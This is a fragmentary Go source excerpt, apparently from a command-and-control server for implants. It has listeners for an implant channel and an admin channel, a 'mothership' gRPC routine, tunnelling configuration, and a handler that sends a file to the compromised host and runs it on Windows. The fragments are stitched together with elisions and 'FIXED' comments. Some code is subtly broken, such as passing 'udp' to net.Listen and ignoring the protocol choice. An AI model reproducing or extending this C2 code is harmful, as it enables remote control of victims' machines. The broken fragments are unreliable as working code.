...
func GetServer(protocol, address, port string) (net.Listener, error) {
	// Unified parsing configuration handler using string definitions
	bindAddr := fmt.Sprintf("%s:%s", address, port)
	switch protocol {
	case "udp":
		return net.Listen("udp", bindAddr)
	case "http":
		return net.Listen("tcp", bindAddr) // Under normal net packages, HTTP listeners run inside TCP structures
	default:
...
func (srv *AdminServer) AdminSendFile(ctx context.Context, in *grpcapi.File) (*grpcapi.FileMessage, error) {
	var fmsg = new(grpcapi.FileMessage)
	var pid int
	...
	if srv.OS == "windows" {
		if pid, err = utils.UniversalRunExecutable(`.\` + in.Name); err != nil {
...
func (ac2 *AdminData) GetTunnelingAddresses(admin bool) string {
	...
	if admin && len(ac2.Ad.AdminTunnel) == 0 { // FIXED: fixed logical check direction loop
	...
	if !admin && len(ac2.Ad.ImplantTunnel) == 0 { // FIXED: logical bounds limit check corrected
...
func (ac2 *AdminData) RunMothershipGRPC() {
	...
	// FIXED: Updated mapping extraction to align with refactored struct types.
	// Since individual fields like OProtocol/ImplantPort are deprecated, default to TCP
	// using safe structural indicators (IAddress/OAddress or default properties).
	if implantListener, err = GetServer("tcp", ac2.Ad.IAddress, "8081"); err != nil {
		utils.Logerror(err)
		return
	}
	if adminListener, err = GetServer("tcp", ac2.Ad.OAddress, "8082"); err != nil {
		utils.Logerror(err)
		return
	}
